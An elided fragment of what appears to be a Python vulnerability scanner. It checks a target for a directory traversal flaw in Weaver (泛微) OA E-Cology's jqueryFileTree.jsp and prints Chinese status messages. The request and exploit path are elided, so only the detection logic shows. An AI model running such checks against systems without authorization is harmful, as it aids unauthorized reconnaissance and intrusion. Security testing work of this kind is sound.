...
def main(target_url):
    ...
    console.print(now_time() + " [INFO]     正在检测泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞", style='bold blue')
    try:
        ...
        if response.status_code== 200 and 'index.jsp' in response.text:
            console.print(now_time() + ' [SUCCESS]  存在泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞:{}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + " [WARNING]  不存在泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞", style='bold red')
    except:
